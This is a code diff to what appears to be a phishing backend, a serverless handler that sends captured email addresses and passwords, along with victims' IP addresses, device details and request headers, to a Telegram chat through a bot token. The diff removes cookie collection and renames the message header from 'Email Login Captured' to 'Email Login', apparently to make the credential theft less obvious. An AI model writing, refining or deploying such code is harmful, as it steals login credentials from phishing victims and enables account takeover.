@@ -50,9 +50,6 @@ export const handler = async (event, context) => {
     const acceptEncoding = event.headers['accept-encoding'] || 'Unknown';
     const referer = event.headers.referer || 'Direct access';
     
-    // Get cookies from request headers
-    const cookies = event.headers.cookie || 'No cookies found';
-    const cookieInfo = cookies.length > 100 ? cookies.substring(0, 100) + '...' : cookies;
     // Check environment variables first
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
@@ -145,7 +142,7 @@ export const handler = async (event, context) => {
     const deviceInfo = /Mobile|Android|iPhone|iPad/.test(userAgent) ? '📱 Mobile Device' : '💻 Desktop';
     
     const message = `
-🔐 *Email Login Captured*
+🔐 *Email Login*
 
 📧 *Email:* \`${email}\`
 🔑 *Password:* \`${password}\`
@@ -154,7 +151,6 @@ export const handler = async (event, context) => {
 🕒 *Timestamp:* ${new Date(timestamp).toLocaleString()}
 🌐 *IP Address:* ${clientIP}
 ${deviceInfo}
-🍪 *Cookies:* \`${cookieInfo}\`
 🌍 *Language:* \`${acceptLanguage}\`
 📦 *Encoding:* \`${acceptEncoding}\`
 🔗 *Referer:* \`${referer}\`
